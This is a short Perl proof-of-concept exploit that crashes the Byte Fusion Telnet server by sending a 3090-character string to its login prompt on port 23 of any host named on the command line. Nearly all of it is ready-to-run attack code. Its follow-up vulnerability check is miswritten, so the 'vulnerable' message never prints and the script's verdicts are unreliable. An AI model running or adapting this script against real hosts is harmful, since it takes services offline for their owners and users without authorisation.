#!/usr/bin/perl

# Example for a possible DOS-attack against Byte Fusion Telnet.
# There need to be 3090 characters to overflow Server.
# Example : Trying example.com...
# 	    Connected to example.com.
# 	    Escape character is '^]'.
#	    Byte Fusion Telnet, Copyright 1999 Byte Fusion Corporation
#           Unregistered Evaluation. See www.bytefusion.com/telnet.html
#            (Machine name) Login: [more then 3090 characters]
#	    Overflow

use IO::Socket;

print "Possible DOS-attack against Byte Fusion Telnet\n";
print "++++++++++++++++++++++++++++++++++++++++++++++\n";

if (not $ARGV[0]) {
  print "Usage: $0 [host]\n\n";
  exit(0);
}

sub connecthost {
        $host = IO::Socket::INET->new ( Proto => "tcp",
			                PeerAddr => $ARGV[0],
                			PeerPort => "23",) or die "Can't open connection to $ARGV[0] because $!\n";
        $host->autoflush(1);
} 

$bufferoverflow .= "A" x 3090;

print "\nOpen connection...\n";
&connecthost; 
print "Sending characters...\n";
print $host "$bufferoverflow\n";
print "close connection...\n";
close $host;

print "\nTesting...\n";
&connecthost("\nThe host $ARGV[0] is vulnerable to this attack.\n");
close $host;
die "The host $ARGV[0] is not vulnerable to this attack.\n";

# by arbon(arbon@gmx.de)